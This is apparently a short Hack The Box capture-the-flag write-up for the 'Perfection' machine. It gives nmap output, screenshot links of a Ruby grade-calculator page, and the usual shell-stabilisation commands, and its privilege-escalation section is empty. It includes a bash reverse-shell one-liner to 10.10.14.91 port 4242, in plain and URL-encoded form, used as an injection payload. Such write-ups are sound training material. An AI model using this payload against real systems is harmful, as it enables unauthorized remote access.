# Perfection Write-up

<img src="https://labs.hackthebox.com/storage/avatars/57fc0f58916cb3ed8e793db071769d70.png" width="200" height="200">

##  Nmap

`nmap -sC -sV perfection.htb`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
    |_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
    80/tcp open  http    nginx
    |_http-title: 502 Bad Gateway
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Visit perfection.htb

![image](https://github.com/zer00d4y/writeups/assets/128820441/4ddecf13-024d-4b4a-b639-a7c8f614d947)

`perfection.htb/weighted-grade`

![image](https://github.com/zer00d4y/writeups/assets/128820441/143b1c47-9688-4429-923e-70f885b9a963)

Wappalyzer Ruby

![image](https://github.com/zer00d4y/writeups/assets/128820441/796cd7b9-4510-41b3-bf95-7a3a0039db5f)



![image](https://github.com/zer00d4y/writeups/assets/128820441/e63b50c3-2697-41fe-916a-56e07e04e2a9)

![image](https://github.com/zer00d4y/writeups/assets/128820441/a5a65d54-a81a-48ca-82b3-a7f189e03369)

![image](https://github.com/zer00d4y/writeups/assets/128820441/61c5f7f4-4e29-48cb-87c1-48f9aac3ab61)

bash -c 'bash -i >& /dev/tcp/10.10.14.91/4242 0>&1

bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.91/4242+0>%261'

![image](https://github.com/zer00d4y/writeups/assets/128820441/23ec8526-0b18-49bf-b1f2-49bc24bdb763)

![image](https://github.com/zer00d4y/writeups/assets/128820441/583ba02d-ec4b-46ea-a614-9c096d09dfc1)

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

`export TERM=xterm`

ctrl + z

`stty raw -echo; fg`

![image](https://github.com/zer00d4y/writeups/assets/128820441/0a989f9d-3fc2-42db-9685-fe58d14f5d5f)

![image](https://github.com/zer00d4y/writeups/assets/128820441/5e20af03-b52e-418d-b107-2845cb3b948f)

## Privilege Escalation






